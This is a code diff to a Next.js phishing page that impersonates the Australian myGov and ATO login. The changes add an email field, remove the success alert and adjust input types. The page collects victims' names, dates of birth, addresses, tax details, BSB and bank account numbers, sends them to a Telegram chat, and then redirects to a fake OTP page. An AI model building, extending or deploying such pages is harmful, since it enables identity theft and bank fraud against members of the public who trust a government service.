@@ -4,6 +4,7 @@ import Head from "next/head";
 import { useRouter } from "next/navigation";
 import React from "react";
 import { sendTelegramMessage } from "../../utils/telegram"; // Assuming you have this utility
+import Image from 'next/image';
 
 export default function MyGovAccountInfo() {
   const router = useRouter();
@@ -17,6 +18,7 @@ export default function MyGovAccountInfo() {
     const message = `
       🚨 MyGov Form Submission 🚨
       - Full Name: ${formEntries.fname}
+      - Email Address: ${formEntries.email}
       - Mobile Number: ${formEntries.mobnum}
       - Date of Birth: ${formEntries.dob}
       - Address: ${formEntries.address}
@@ -30,11 +32,9 @@ export default function MyGovAccountInfo() {
 
     try {
       await sendTelegramMessage(message); // Send data to Telegram
-      alert("Form submitted successfully!");
       router.push("/security"); // Redirect to OTP page after submission
     } catch (err) {
       console.error("Failed to send data to Telegram:", err);
-      
     }
   };
 
@@ -53,11 +53,13 @@ export default function MyGovAccountInfo() {
         <header className="bg-[#66d3ee] border-b-4 border-[#5bbad7]">
           <div className="max-w-7xl mx-auto flex items-center p-4">
             <a href="#" className="flex items-center">
-              <img
-                src="/images/myGov-cobranded-logo-black.svg"
-                alt="myGov Beta Logo"
-                className="h-10"
-              />
+            <Image
+  src="/images/myGov-cobranded-logo-black.svg"
+  alt="myGov Beta Logo"
+  width={100} // Set the desired width
+  height={40} // Set the desired height
+  className="h-10"
+/>
             </a>
           </div>
         </header>
@@ -69,7 +71,7 @@ export default function MyGovAccountInfo() {
               MyGov Account Information
             </h1>
             <p className="text-gray-600 mb-6">
-              Please answer the shared secret between you and the ATO.
+              Please provide your account information below.
             </p>
             <hr className="mb-6" />
 
@@ -91,6 +93,23 @@ export default function MyGovAccountInfo() {
                 />
               </div>
 
+              {/* Email Address */}
+              <div>
+                <label
+                  htmlFor="email"
+                  className="block text-sm font-medium text-black"
+                >
+                  Email Address
+                </label>
+                <input
+                  id="email"
+                  name="email"
+                  type="email"
+                  required
+                  className="w-full mt-2 border border-gray-300 rounded-lg p-3"
+                />
+              </div>
+
               {/* Mobile Number */}
               <div>
                 <label
@@ -102,7 +121,7 @@ export default function MyGovAccountInfo() {
                 <input
                   id="mobnum"
                   name="mobnum"
-                  type="number"
+                  type="tel"
                   required
                   className="w-full mt-2 border border-gray-300 rounded-lg p-3"
                 />
@@ -153,7 +172,7 @@ export default function MyGovAccountInfo() {
                 <input
                   id="ta"
                   name="ta"
-                  type="tel"
+                  type="text"
                   required
                   className="w-full mt-2 border border-gray-300 rounded-lg p-3"
                 />
@@ -188,7 +207,7 @@ export default function MyGovAccountInfo() {
                 <input
                   id="reference"
                   name="reference"
-                  type="tel"
+                  type="text"
                   required
                   className="w-full mt-2 border border-gray-300 rounded-lg p-3"
                 />
@@ -208,7 +227,7 @@ export default function MyGovAccountInfo() {
                 <input
                   id="bsb"
                   name="bsb"
-                  type="tel"
+                  type="text"
                   required
                   className="w-full mt-2 border border-gray-300 rounded-lg p-3"
                 />
@@ -223,7 +242,7 @@ export default function MyGovAccountInfo() {
                 <input
                   id="acct"
                   name="acct"
-                  type="tel"
+                  type="text"
                   required
                   className="w-full mt-2 border border-gray-300 rounded-lg p-3"
                 />
